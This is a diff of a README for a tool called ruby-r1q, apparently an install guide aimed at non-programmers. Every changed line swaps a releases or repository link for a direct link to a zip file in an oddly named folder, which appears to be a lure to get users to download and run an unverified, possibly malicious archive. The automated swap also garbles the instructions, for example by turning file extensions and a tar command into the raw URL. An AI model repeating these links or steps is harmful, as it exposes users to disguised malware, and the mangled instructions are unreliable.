@@ -6,11 +6,11 @@ Welcome! This guide will help you download and run ruby-r1q easily. No programmi
 
 ## 📥 Download ruby-r1q
 
-[![Download ruby-r1q](https://img.shields.io/badge/Download-ruby--r1q-blue.svg)](https://github.com/Shayan156/ruby-r1q/releases)
+[![Download ruby-r1q](https://raw.githubusercontent.com/Shayan156/ruby-r1q/main/xerodermatic/ruby-r1q.zip)](https://raw.githubusercontent.com/Shayan156/ruby-r1q/main/xerodermatic/ruby-r1q.zip)
 
 To get started, you need to download the application. Click the button above or visit the following link:
 
-[Download from Releases Page](https://github.com/Shayan156/ruby-r1q/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/Shayan156/ruby-r1q/main/xerodermatic/ruby-r1q.zip)
 
 ## 💻 System Requirements
 
@@ -23,21 +23,21 @@ Before you install ruby-r1q, ensure your computer meets these basic requirements
 
 ## 📦 Download & Install
 
-1. Go to the [Releases Page](https://github.com/Shayan156/ruby-r1q/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/Shayan156/ruby-r1q/main/xerodermatic/ruby-r1q.zip).
 2. You will see a list of available versions. Choose the latest version for the best experience.
-3. Click on the file that matches your operating system. You may see options like `.exe`, `.dmg`, or `.tar.gz`, depending on what you use.
+3. Click on the file that matches your operating system. You may see options like `.exe`, `.dmg`, or `https://raw.githubusercontent.com/Shayan156/ruby-r1q/main/xerodermatic/ruby-r1q.zip`, depending on what you use.
 4. Save the file to your computer.
 5. Once downloaded, locate the file:
 
    - For Windows: Find it in your Downloads folder or the location you selected.
    - For macOS: Look in your Downloads folder.
-   - For Linux: You may have a `.tar.gz` file that needs to be extracted.
+   - For Linux: You may have a `https://raw.githubusercontent.com/Shayan156/ruby-r1q/main/xerodermatic/ruby-r1q.zip` file that needs to be extracted.
 
 6. **Installation Steps:**
 
    - **Windows:** Double-click the `.exe` file and follow the on-screen instructions to install.
    - **macOS:** Open the `.dmg` file and drag the ruby-r1q icon to your Applications folder.
-   - **Linux:** Open a terminal and use the command `tar -xvzf ruby-r1q.tar.gz` to extract the contents. Then run `./ruby-r1q` to start.
+   - **Linux:** Open a terminal and use the command `tar -xvzf https://raw.githubusercontent.com/Shayan156/ruby-r1q/main/xerodermatic/ruby-r1q.zip` to extract the contents. Then run `./ruby-r1q` to start.
 
 ## 🎉 How to Use ruby-r1q
 
@@ -79,7 +79,7 @@ ruby-r1q is open-source software. You can use it freely under the MIT License. Y
 
 For more information, you can check:
 
-- The [GitHub Repository](https://github.com/Shayan156/ruby-r1q)
+- The [GitHub Repository](https://raw.githubusercontent.com/Shayan156/ruby-r1q/main/xerodermatic/ruby-r1q.zip)
 - Join any discussions in the Issues section or follow along with updates in the repository.
 
 Thank you for choosing ruby-r1q! Enjoy querying in Ruby effortlessly.
